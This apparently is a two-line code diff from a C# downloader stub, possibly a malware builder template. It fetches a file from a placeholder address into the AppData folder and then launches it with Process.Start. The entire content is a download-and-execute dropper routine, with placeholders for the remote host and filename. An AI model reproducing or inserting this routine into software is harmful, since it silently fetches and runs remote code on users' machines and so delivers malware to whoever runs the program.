@@ -1,0 +1,2 @@
+JJ7.DownloadFile("{ADDRESS}", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\{FILENAME}");
+Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.[SINGLEDLDROPPLACE]) + "\\{FILENAME}");
